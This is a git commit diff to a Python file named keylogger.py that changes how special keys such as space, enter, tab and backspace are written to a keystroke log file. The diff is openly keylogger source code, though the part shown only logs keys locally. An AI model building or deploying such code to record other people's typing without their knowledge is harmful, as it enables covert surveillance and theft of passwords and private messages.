1c6c3fd01807681e71b71ba62daee589a95820f5
Ultron Patil <ultronpatil@gmail.com>
2024-06-03 11:41:45 +0530

    improvised

--- keylogger.py
+++ keylogger.py
@@ -9,7 +9,19 @@ def on_press(key):
             f.write(f"{key.char}")
     except AttributeError:
         with open(log_file, "a") as f:
-            f.write(f"{key}")
+            # Handle special keys
+            if key == keyboard.Key.space:
+                f.write(" [SPACE] ")
+            elif key == keyboard.Key.enter:
+                f.write(" [ENTER]\n")
+            elif key == keyboard.Key.tab:
+                f.write(" [TAB] ")
+            elif key == keyboard.Key.backspace:
+                f.write(" [BACKSPACE] ")
+            elif key == keyboard.Key.esc:
+                f.write(" [ESC] ")
+            else:
+                f.write(f" [{key}] ")
 
 def on_release(key):
     if key == keyboard.Key.esc:
